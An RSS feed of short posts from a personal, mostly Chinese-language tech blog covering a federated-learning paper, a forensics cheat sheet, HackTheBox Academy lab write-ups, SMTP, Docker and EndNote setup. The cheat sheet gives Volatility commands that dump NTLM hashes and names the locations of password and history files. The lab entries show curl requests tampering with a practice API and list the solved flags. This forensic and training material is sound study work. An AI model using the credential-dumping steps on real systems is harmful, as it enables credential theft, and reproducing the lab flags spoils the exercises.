 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Jin, W., Yao, Y., Han, S., Joe-Wong, C., Ravi, S., Avestimehr, S., &amp;amp; He, C. (2023). FedML-HE: An Efficient Homomorphic-Encryption-Based Privacy-Preserving Federated Learning System. arXiv preprint arXiv:2303.10837.
:::
[TOC]&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="聯邦學習攻擊方式">
 &lt;a href="https://ithelp.ithome.com.tw/articles/10302263?sc=iThelpR">聯邦學習：攻擊方式&lt;/a>
 &lt;a class="anchor" href="#%e8%81%af%e9%82%a6%e5%ad%b8%e7%bf%92%e6%94%bb%e6%93%8a%e6%96%b9%e5%bc%8f">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler&lt;/p>
&lt;blockquote>
&lt;p>成員推理攻擊
攻擊者試圖確定某些資料是否是訓練的一部分與模型反轉攻擊一樣，攻擊者利用返回的分類分數來創建多個這些 影子 模型，模型與受攻擊的原始模型具有相似的分類邊界。
給定一個 黑盒 機器學習模型和一個資料記錄，確定該記錄是否用作模型的訓練資料集的一部分，被證明是可能的，具有極高的準確性。
因此，僅對在給定輸入上返回模型輸出的黑盒 API 進行簡單的查詢訪問，就可能洩露有關模型訓練所依據的各個資料記錄的大量訊息。
推理攻擊的準確性隨著類別數量的增加而增加。
:::&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;h3 id="what-is-multi-party-computation-mpc">
 &lt;a href="https://www.eettaiwan.com/20220609nt21-multi-party-computation/">What is Multi Party Computation (MPC)?&lt;/a>
 &lt;a class="anchor" href="#what-is-multi-party-computation-mpc">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler&lt;/p></description></item><item><title>Forensics Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/forensics-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/forensics-cheat-sheet/</guid><description>&lt;h1 id="forensics-cheat-sheet">
 Forensics Cheat Sheet
 &lt;a class="anchor" href="#forensics-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="windows">
 Windows
 &lt;a class="anchor" href="#windows">#&lt;/a>
&lt;/h2>
&lt;h3 id="where">
 Where
 &lt;a class="anchor" href="#where">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>SOFTWARE: &lt;code>root/Windows/System32/config/SOFTWARE&lt;/code>&lt;/li>
&lt;li>SYSTEM: &lt;code>root/Windows/System32/config/SYSTEM&lt;/code>&lt;/li>
&lt;li>NTUSER.DAT: &lt;code>root/Users/{username}/NTUSER.DAT&lt;/code>&lt;/li>
&lt;li>$MFT: &lt;code>root/$MFT&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="software-information">
 SOFTWARE Information
 &lt;a class="anchor" href="#software-information">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>原本電腦OS的基本資訊(Build Number/Product Name/):
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion&lt;/code>&lt;/li>
&lt;li>檢查SID:
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList&lt;/code>&lt;/li>
&lt;li>查看登入:
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon&lt;/code>&lt;/li>
&lt;li>StartUp Run:
&lt;code>SOFTWARE/Microsoft/Windows/CurrentVersion/Run&lt;/code>&lt;/li>
&lt;/ul>
&lt;h4 id="ntuserdat每個使用者都不一樣">
 NTUSER.DAT(每個使用者都不一樣)
 &lt;a class="anchor" href="#ntuserdat%e6%af%8f%e5%80%8b%e4%bd%bf%e7%94%a8%e8%80%85%e9%83%bd%e4%b8%8d%e4%b8%80%e6%a8%a3">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>UserAssit:
&lt;code>root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/UserAssist&lt;/code>&lt;/li>
&lt;li>Recent Docs:
&lt;code>root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="system-information">
 System Information
 &lt;a class="anchor" href="#system-information">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>電腦名稱:
&lt;code>SYSTEM/ControlSet001/Control/ComputerName/ComputerName&lt;/code>&lt;/li>
&lt;li>電腦IP/DHCP相關資訊:
&lt;code>SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/&lt;/code>&lt;/li>
&lt;li>時區:
&lt;code>SYSTEM/ControlSet001/Control/TimeZoneInformation&lt;/code>&lt;/li>
&lt;li>USB資訊:
&lt;code>SYSTEM/ControlSet001/Enum/USBSTOR/&lt;/code>&lt;/li>
&lt;li>CPU架構:
&lt;code>SYSTEM/ControlSet001/Control/Session Manager/Environment/&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="database">
 Database
 &lt;a class="anchor" href="#database">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Chrome History:
&lt;code>./Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History&lt;/code>&lt;/li>
&lt;li>Firefox History:
&lt;code>./Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/{random}.default-release/places.sqlite&lt;/code>&lt;/li>
&lt;li>Skype Chat History:
&lt;code>./Users/{username}/AppData/Roaming/Skype/{account name}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="taskbar">
 Taskbar
 &lt;a class="anchor" href="#taskbar">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;code>./Users/{username}/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="mac-os">
 mac-OS
 &lt;a class="anchor" href="#mac-os">#&lt;/a>
&lt;/h2>
&lt;h3 id="plist">
 plist
 &lt;a class="anchor" href="#plist">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install libplist-utils -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ plistutil -i &lt;span style="color:#f92672">{&lt;/span>plist file&lt;span style="color:#f92672">}&lt;/span> -o &lt;span style="color:#f92672">{&lt;/span>output file&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>System Version:
&lt;code>./root/System/Library/CoreServices/SystemVersion.plist&lt;/code>&lt;/li>
&lt;li>Browser Bookmark
&lt;code>./root/Users/{username}/Library/Safari/Bookmarks.plist&lt;/code>&lt;/li>
&lt;li>Password information
&lt;code>./root/private/var/db/dslocal/nodes/Default/users/{username}.plist&lt;/code>&lt;/li>
&lt;li>The process responsible for connecting iPhones/iPads with MacOS is lockdown
&lt;code>./root/private/var/db/dslocal/nodes/Default/users/_usbmux.plist&lt;/code>&lt;/li>
&lt;li>Spotlight(這個不需要透過plistutil就可以直接cat)
&lt;code>./root/Users/{username}/Library/Application Support/com.apple.spotlight/com.apple.spotlight.Shortcuts&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="event-log">
 Event Log
 &lt;a class="anchor" href="#event-log">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>短期檔案系統變更儲存在&lt;code>.fseventsd&lt;/code>中，必須使用&lt;code>mac_apt&lt;/code>這個工具幫忙parse(FSEVENTS)
&lt;code>./root/.fseventsd/&lt;/code>&lt;/li>
&lt;li>ScreenTime: 一樣要透過&lt;code>mac_apt&lt;/code>幫忙parse(SCREENTIME)，記得要把&lt;code>RMAdminStore-Local.sqlite-wal&lt;/code>這個檔案和&lt;code>RMAdminStore-Local.sqlite&lt;/code>放在一起執行
&lt;code>./root/private/var/folders/bf/{random strings}/0/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="database-1">
 Database
 &lt;a class="anchor" href="#database-1">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Note
&lt;code>./root/Users/{username}/Library/Group Containers/group.com.apple.notes&lt;/code>&lt;/li>
&lt;li>Quarantined Events
&lt;code>./root/Users/{username}/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2&lt;/code>&lt;/li>
&lt;li>Messages
&lt;code>./root/Users/{username}/Library/Messages/chat.db&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="volatilitys">
 Volatilitys
 &lt;a class="anchor" href="#volatilitys">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">主要的CheatSheet&lt;/a>&lt;/li>
&lt;li>ldrmodules: 更進階的dlllist，可以顯示被隱藏的dll，以及dll的狀態
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} ldrmodules --pid {pid}&lt;/code>&lt;/li>
&lt;li>如果要dump被injected過的process:
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} malfind --pid {pid} --dump-dir={output folder}&lt;/code>&lt;/li>
&lt;li>dump hash
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} hashdump &amp;gt; ntlm.hash&lt;/code>&lt;/li>
&lt;li>如果是要找到某個東西的timestamp，可以考慮直接用timeliner這個plubin，主要的功能是就是建立記憶體中的各種痕跡資訊的時間線
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} timeliner &lt;/code>&lt;/li>
&lt;li>查看網路連線紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} netscan&lt;/code>&lt;/li>
&lt;li>在memory中用yarascan去search不同的pattern
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} yarascan -Y &amp;quot;example strings&amp;quot;&lt;/code>&lt;/li>
&lt;li>console中的command紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} consoles&lt;/code>&lt;/li>
&lt;li>查看iexplorer的紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} iehistory&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>Git Large File Error - Solution</title><link>https://bernie6401.github.io/docs/problem-solutions/git-large-file-error---solution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/git-large-file-error---solution/</guid><description>&lt;h1 id="git-large-file-error---solution">
 Git Large File Error - Solution
 &lt;a class="anchor" href="#git-large-file-error---solution">#&lt;/a>
&lt;/h1>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.51cto.com/frytea/4143701">解决git不小心提交大文件导致无法提交问题 &lt;/a>
&lt;a href="https://stackoverflow.com/questions/30316723/git-filter-branch-remove-folder-failed">git filter-branch remove folder failed&lt;/a>
&lt;a href="https://andy6804tw.github.io/2018/12/09/git-exceeds-size/">[Git筆記] exceeds GitHub file size 解決&lt;/a>&lt;/p>
&lt;h2 id="scenario-1">
 Scenario 1
 &lt;a class="anchor" href="#scenario-1">#&lt;/a>
&lt;/h2>
&lt;p>如果是在加入後不慎注意，就直接commit並且push才發現的，要用以下解法&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">...
$ git push # Now it has large file problem
# Assume the path of large file is : PicoCTF/2023/Reverse/Reverse/ida-20230316-000006-17384.dmp
$ git filter-branch -f --index-filter &amp;#39;git rm --cached --ignore-unmatch PicoCTF/2023/Reverse/Reverse/ida-20230316-000006-17384.dmp&amp;#39;
$ git push #Then it works
&lt;/code>&lt;/pre>&lt;p>:::info
如果在變更過程中出現&lt;code>Cannot rewrite branches: You have unstaged changes.&lt;/code>，代表以一些檔案沒有被add以及commit，需要先把其他檔案都做完整的commit後才可以執行上述操作
:::&lt;/p></description></item><item><title>HackTheBox</title><link>https://bernie6401.github.io/docs/security/practice/hackthebox/hackthebox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/hackthebox/hackthebox/</guid><description>&lt;h1 id="hackthebox">
 HackTheBox
 &lt;a class="anchor" href="#hackthebox">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="web-requests-get">
 &lt;a href="https://academy.hackthebox.com/module/35/section/247">Web Requests-GET&lt;/a>
 &lt;a class="anchor" href="#web-requests-get">#&lt;/a>
&lt;/h2>
&lt;h3 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h3>
&lt;p>cURL - GET/Header&lt;/p>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl &lt;span style="color:#e6db74">&amp;#39;http://144.126.206.249:31846/search.php?search=flag&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">&amp;#39;Authorization: Basic YWRtaW46YWRtaW4=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag: HTB&lt;span style="color:#f92672">{&lt;/span>curl_g3773r&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="web-requests-post">
 &lt;a href="https://academy.hackthebox.com/module/35/section/224">Web Requests-POST&lt;/a>
 &lt;a class="anchor" href="#web-requests-post">#&lt;/a>
&lt;/h2>
&lt;h3 id="background-1">
 Background
 &lt;a class="anchor" href="#background-1">#&lt;/a>
&lt;/h3>
&lt;p>cURL - POST/Cookie/Json Data/Header&lt;/p>
&lt;h3 id="exploit-1">
 Exploit
 &lt;a class="anchor" href="#exploit-1">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ curl &amp;#39;http://142.93.47.151:30718/search.php&amp;#39; -b &amp;#39;PHPSESSID=darsv7lbe3aa22nv4v82h039p6&amp;#39; -X POST -d &amp;#39;{&amp;#34;search&amp;#34;:&amp;#34;flag&amp;#34;}&amp;#39; -H &amp;#39;Content-Type: application/json&amp;#39;
[&amp;#34;flag: HTB{p0$t_r3p34t3r}&amp;#34;]%
&lt;/code>&lt;/pre>&lt;h2 id="web-requests-crud">
 &lt;a href="https://academy.hackthebox.com/module/35/section/227">Web Requests-CRUD&lt;/a>
 &lt;a class="anchor" href="#web-requests-crud">#&lt;/a>
&lt;/h2>
&lt;h3 id="background-2">
 Background
 &lt;a class="anchor" href="#background-2">#&lt;/a>
&lt;/h3>
&lt;h3 id="exploit-2">
 Exploit
 &lt;a class="anchor" href="#exploit-2">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"># Read all the city
$ curl -s http://165.232.44.246:31084/api.php/city/ \| jq
[{&amp;#34;city_name&amp;#34;:&amp;#34;London&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;},{&amp;#34;city_name&amp;#34;:&amp;#34;Birmingham&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;},{&amp;#34;city_name&amp;#34;:&amp;#34;Leeds&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;},{&amp;#34;city_name&amp;#34;:&amp;#34;Glasgow&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;},{&amp;#34;city_name&amp;#34;:&amp;#34;Sheffield&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(UK)&amp;#34;}...,{&amp;#34;city_name&amp;#34;:&amp;#34;Baltimore&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;(US)&amp;#34;}]%

# Update city Baltimore to flag
$ curl -X PUT http://165.232.44.246:31084/api.php/city/Baltimore -d &amp;#39;{&amp;#34;city_name&amp;#34;:&amp;#34;flag&amp;#34;, &amp;#34;country_name&amp;#34;:&amp;#34;(US)&amp;#34;}&amp;#39; -H &amp;#39;Content-Type: application/json&amp;#39;

# Delete any city
$ curl -X DELETE http://165.232.44.246:31084/api.php/city/Detroit

# Read city named flag to get flag
$ curl -s http://165.232.44.246:32034/api.php/city/ \| jqcurl -s http://165.232.44.246:31084/api.php/city/flag
[{&amp;#34;city_name&amp;#34;:&amp;#34;flag&amp;#34;,&amp;#34;country_name&amp;#34;:&amp;#34;HTB{crud_4p!_m4n!pul4t0r}&amp;#34;}]%
&lt;/code>&lt;/pre>&lt;h2 id="javascript-deobfuscation-decoding">
 &lt;a href="https://academy.hackthebox.com/module/41/section/445">JavaScript Deobfuscation-Decoding&lt;/a>
 &lt;a class="anchor" href="#javascript-deobfuscation-decoding">#&lt;/a>
&lt;/h2>
&lt;h3 id="exploit-3">
 Exploit
 &lt;a class="anchor" href="#exploit-3">#&lt;/a>
&lt;/h3>
&lt;p>Use CypherChef First to decode &lt;code>N2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz&lt;/code>&lt;/p></description></item><item><title>How How to use Mailgun/Resend as SMTP server?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-how-to-use-mailgun_resend-as-smtp-server_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-how-to-use-mailgun_resend-as-smtp-server_/</guid><description>&lt;h1 id="how-how-to-use-mailgunresend-as-smtp-server">
 How How to use Mailgun/Resend as SMTP server?
 &lt;a class="anchor" href="#how-how-to-use-mailgunresend-as-smtp-server">#&lt;/a>
&lt;/h1>
&lt;p>會有這個紀錄是因為deploy Mastodon Instance時需要用到SMTP Server，雖然是Optional，但還是嘗試建立一個試看看&lt;/p>
&lt;h2 id="prerequisite">
 Prerequisite
 &lt;a class="anchor" href="#prerequisite">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>有一台具有domain的device&lt;/li>
&lt;/ul>
&lt;h2 id="mailgun-step">
 Mailgun Step
 &lt;a class="anchor" href="#mailgun-step">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>先到&lt;a href="https://app.mailgun.com">官網&lt;/a>註冊帳號&lt;/li>
&lt;li>在Sending &amp;gt; Domains中新增Domain，我是只有domain name，而不是包含subdomain
&lt;img src="https://hackmd.io/_uploads/HygMAixKM1g.png" alt="圖片" />
其他參數不用改
&lt;img src="https://hackmd.io/_uploads/SyrSnlKG1l.png" alt="圖片" />&lt;/li>
&lt;li>進入到DNS records並且查看有哪些東西需要加進去到DNS的紀錄，以我的為例，因為我有開啟automatic sender security，所以有以下6個
&lt;img src="https://hackmd.io/_uploads/HkHA2gKM1x.png" alt="圖片" />
包含3個CNAME，2個MX，一個TXT
接著就到當初申請domain的網站，以我的為例是namesilo，新增這幾個紀錄，就是複製貼上，最後新增完如下
&lt;img src="https://hackmd.io/_uploads/r1CLpgYGkg.png" alt="圖片" />&lt;/li>
&lt;li>接著就一直等，由於DNS更新也會需要時間，所以mailgun要verify也可能要等很久，我大概是等了半小時才好，在Mailgun的Domain Setting頁面，會顯示所有的紀錄為Verified或是Active的字樣(如上上圖)&lt;/li>
&lt;li>接著就看哪一個service需要用到SMTP，以我的為例就是Mastodon Instance，他會建立一個.env.production，裡面就要放SMTP會用到的環境變數，如下
&lt;pre tabindex="0">&lt;code>SMTP_SERVER=smtp.mailgun.org
SMTP_PORT=587
SMTP_LOGIN=postmaster@sbk6401.sbs
SMTP_PASSWORD=&amp;lt;your SMTP Password&amp;gt;
SMTP_AUTH_METHOD=plain
SMTP_OPENSSL_VERIFY_MODE=none
SMTP_ENABLE_STARTTLS=auto
SMTP_FROM_ADDRESS=&amp;#39;Mastodon &amp;lt;notifications@mastodon.sbk6401.sbs&amp;gt;&amp;#39;
&lt;/code>&lt;/pre>首先解釋一下上面的變數
SMTP_SERVER和SMTP_PORT建議不要改，login如果沒有特別指定，就是使用postmaster@&amp;lt;your domain name&amp;gt;，而password要到Mailgun的SMTP Credentials中，利用Reset Password並且複製新的密碼就可以貼上
&lt;img src="https://hackmd.io/_uploads/HyWxlWKfJx.png" alt="圖片" />
而auto_method、openssl_verify和enable_starttls則是有其他的選項可以選，可以視情況自行使用，from_address則是看要用什麼身份傳送mail，我是直接使用mastodon的預設模式&lt;/li>
&lt;li>Done!!!
通常這樣沒有什麼問題的話就完成了，只要mastodon有出現任何被Follow、登入、被tag發文等操作，都應該要發送信件通知才對&lt;/li>
&lt;/ol>
&lt;h2 id="resend-step">
 Resend Step
 &lt;a class="anchor" href="#resend-step">#&lt;/a>
&lt;/h2>
&lt;p>我發現在設定Bluesky的SMTP的時候，無法用mailgun當作server，不確定是什麼原因，但官方doc說建議用&lt;a href="https://resend.com">Resend&lt;/a>或是&lt;a href="https://sendgrid.com/">SendGrid&lt;/a>，然後和Mailgun設定的差不多，先新增一個自己的domain，然後他會給4個DNS config的紀錄(3個TXT和1個MX)
&lt;img src="https://hackmd.io/_uploads/ryI8KTzX1g.png" alt="image" />
就直接到自己當初申請domain的DNS Server設定，接下來就是等DNS server更新
&lt;img src="https://hackmd.io/_uploads/ByPKYaf7yx.png" alt="image" />
等到更新成功後，先申請API key，到API Keys &amp;gt; Create API Keys 建立SMTP的API，然後就可以開始填寫pds.env&lt;/p></description></item><item><title>How to address docker compose not found?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-address-docker-compose-not-found_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-address-docker-compose-not-found_/</guid><description>&lt;h1 id="how-to-address-docker-compose-not-found">
 How to address docker compose not found?
 &lt;a class="anchor" href="#how-to-address-docker-compose-not-found">#&lt;/a>
&lt;/h1>
&lt;h2 id="problem-statement">
 Problem Statement
 &lt;a class="anchor" href="#problem-statement">#&lt;/a>
&lt;/h2>
&lt;p>如果之前有安裝過docker-compose，而且主要的command是中間有個dash，那是舊的版本，可以參考&lt;a href="https://stackoverflow.com/questions/66514436/difference-between-docker-compose-and-docker-compose">&amp;ldquo;docker compose&amp;quot;和&amp;quot;docker-compose&amp;quot;之間的區別&lt;/a>，但更新的版其實是把dash拿掉，因為要把compose合併到docker的command，這樣的話就需要安裝plugin&lt;/p>
&lt;h2 id="solution">
 Solution
 &lt;a class="anchor" href="#solution">#&lt;/a>
&lt;/h2>
&lt;p>以結論來說就是只要安裝docker-compose-plugin，這個套件，但是我自己遇到以下問題，所以最後一部分是GPT給我的答案，也成功解決問題&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install docker-compose-plugin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reading package lists... Done
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Building dependency tree... Done
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reading state information... Done
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>E: Unable to locate package docker-compose-plugin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Final Solution↓&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo mkdir -p /etc/apt/keyrings
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;deb [arch=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>dpkg --print-architecture&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74"> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu &lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>lsb_release -cs&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74"> stable&amp;#34;&lt;/span> | sudo tee /etc/apt/sources.list.d/docker.list &amp;gt; /dev/null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo apt update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo apt install docker-compose-plugin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker compose version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>How to adjust Endnote's Paragraph in Word?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-adjust-endnotes-paragraph-in-word_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-adjust-endnotes-paragraph-in-word_/</guid><description>&lt;h1 id="how-to-adjust-endnotes-paragraph-in-word">
 How to adjust Endnote&amp;rsquo;s Paragraph in Word?
 &lt;a class="anchor" href="#how-to-adjust-endnotes-paragraph-in-word">#&lt;/a>
&lt;/h1>
&lt;p>參考資料: &lt;a href="https://youtu.be/YMthTCU5isA?si=ZZSlAP0rfPdMAKFY&amp;amp;t=2798">善用Word與EndNote協助論文編排[臺大圖書館HELP講堂20201229]&lt;/a>&lt;/p>
&lt;h2 id="problem-statement">
 Problem Statement
 &lt;a class="anchor" href="#problem-statement">#&lt;/a>
&lt;/h2>
&lt;p>在寫論文的時候會使用到Endnote進行引用索引，但cite paper到word的時候，往往會和投稿的Format不一樣，最直接的方式就是，到確定要投稿之前再選取所有的reference section，並進行調整，但每次看到不正確的Format會很討厭，而且不能夠確定之後是不是不需要在修改，只有重新Update Citation，格式就會跑掉，這是一個蠻麻煩的問題&lt;/p>
&lt;h2 id="solution">
 Solution
 &lt;a class="anchor" href="#solution">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>先確定投稿的Reference Format長怎樣
例如要左右對齊、固定行高、特殊縮排等等
![螢幕擷取畫面 2024-10-10 153232](&lt;a href="https://hackmd.io/_uploads/Hk7wYWr1Jg.png">https://hackmd.io/_uploads/Hk7wYWr1Jg.png&lt;/a> =300x)&lt;/li>
&lt;li>然後到[常用] &amp;gt; [樣式]中右鍵Endnote Bibliography，點選修改，就能針對Endnote的Format進行調整
&lt;img src="https://hackmd.io/_uploads/SJ6BqWr1ke.png" alt="圖片" />
包含段落、定位點、字型、大小等等
&lt;img src="https://hackmd.io/_uploads/rJoRcWr11x.png" alt="圖片" />&lt;/li>
&lt;li>Done
接著就可以放心使用自己設定的Reference格式&lt;/li>
&lt;/ol></description></item><item><title>How to build apk file on React-Native Project?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-build-apk-file-on-react-native-project_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-build-apk-file-on-react-native-project_/</guid><description>&lt;h1 id="how-to-build-apk-file-on-react-native-project">
 How to build apk file on React-Native Project?
 &lt;a class="anchor" href="#how-to-build-apk-file-on-react-native-project">#&lt;/a>
&lt;/h1>
&lt;h2 id="1-確保已完成的環境設置">
 &lt;strong>1. 確保已完成的環境設置&lt;/strong>
 &lt;a class="anchor" href="#1-%e7%a2%ba%e4%bf%9d%e5%b7%b2%e5%ae%8c%e6%88%90%e7%9a%84%e7%92%b0%e5%a2%83%e8%a8%ad%e7%bd%ae">#&lt;/a>
&lt;/h2>
&lt;h3 id="必備工具">
 必備工具：
 &lt;a class="anchor" href="#%e5%bf%85%e5%82%99%e5%b7%a5%e5%85%b7">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>安裝 &lt;a href="https://nodejs.org/">Node.js&lt;/a>.&lt;/li>
&lt;li>安裝 &lt;a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">Java JDK&lt;/a> (推薦 11 或更高版本)。&lt;/li>
&lt;li>安裝 &lt;a href="https://developer.android.com/studio">Android Studio&lt;/a> 並設置環境變量：
&lt;ul>
&lt;li>配置 &lt;code>ANDROID_HOME&lt;/code> 環境變量，指向你的 Android SDK 安裝路徑。&lt;/li>
&lt;li>將以下路徑添加到 &lt;code>PATH&lt;/code>：
&lt;pre tabindex="0">&lt;code>$ANDROID_HOME/tools
$ANDROID_HOME/tools/bin
$ANDROID_HOME/platform-tools
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用以下命令確認 Android SDK 設置正確：
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>adb --version
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="2-檢查-react-native-項目配置">
 &lt;strong>2. 檢查 React Native 項目配置&lt;/strong>
